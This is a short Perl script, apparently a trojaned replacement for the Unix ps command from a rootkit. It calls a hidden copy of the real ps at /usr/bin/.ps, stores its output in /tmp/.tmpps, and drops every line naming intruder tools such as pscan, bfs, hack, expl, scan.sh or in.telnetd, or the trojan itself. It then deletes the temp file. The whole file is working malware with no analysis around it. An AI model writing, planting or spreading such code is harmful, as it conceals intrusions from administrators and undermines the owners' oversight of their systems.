#!/usr/bin/perl
$args="$ARGV[0] $ARGV[1] $ARGV[2] $ARGV[3] $ARGV[4] $ARGV[5] $ARGV[6] $ARGV[7] $ARGV[9] $ARGV[10]";
system "/usr/bin/.ps $args >>/tmp/.tmpps";
open(TEST,"</tmp/.tmpps");
while(<TEST>) {
$data=$_;
if (index($data,"cat") >= 0) { goto nextr; }
if (index($data,"pscan") >= 0) { goto nextr; }
if (index($data,"bfs") >= 0) { goto nextr; }
if (index($data,"binfo") >= 0) { goto nextr; }
if (index($data,"hack") >= 0) { goto nextr; }
if (index($data,"expl") >= 0) { goto nextr; }
if (index($data,"check") >= 0) { goto nextr; }
if (index($data,"scan.sh") >= 0) { goto nextr; }
if (index($data,"xargs") >= 0) { goto nextr; }
if (index($data,"perl /bin/ps") >= 0) { goto nextr; }
if (index($data,"/usr/bin/.ps") >= 0) { goto nextr; }
if (index($data,"login") >= 0) { goto nextr; }
if (index($data,"in.telnetd") >= 0) { goto nextr; }

print "$data";
nextr:;
}
system "rm -rf /tmp/.tmpps";
